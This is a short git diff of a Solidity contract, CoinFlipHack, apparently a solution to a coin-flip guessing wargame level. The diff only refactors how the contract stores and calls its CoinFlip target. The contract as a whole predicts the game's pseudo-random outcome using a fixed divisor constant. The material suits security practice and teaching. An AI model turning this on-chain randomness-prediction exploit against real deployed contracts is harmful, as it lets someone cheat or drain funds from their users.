@@ -5,12 +5,12 @@ import "./CoinFlip.sol";
 
 contract CoinFlipHack {
 
-    address target;
+    CoinFlip target;
     
     uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _target) {
-        target = _target;
+        target = CoinFlip(_target);
     }
 
     function flip() public {
@@ -21,7 +21,7 @@ contract CoinFlipHack {
 
         bool side = coinFlip == 1 ? true : false;
 
-        CoinFlip(target).flip(side);
+        target.flip(side);
     }
 
 }
